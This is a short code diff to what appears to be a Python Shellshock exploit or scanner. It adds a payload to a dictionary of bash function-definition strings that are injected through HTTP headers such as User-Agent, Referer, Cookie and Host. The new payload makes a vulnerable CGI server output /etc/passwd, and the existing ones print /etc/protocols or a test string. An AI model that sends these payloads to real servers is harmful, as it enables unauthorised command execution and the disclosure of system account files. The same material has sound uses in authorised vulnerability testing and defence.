@@ -17,6 +17,7 @@ if (len(sys.argv)<=1) or (len(sys.argv)>2):
 '''
 payloads = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
             2:'() { :;} ; echo busted',
+            3:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd',
            }
 http_headers = ['User-Agent', 'Referer', 'Cookie', 'Host']
 
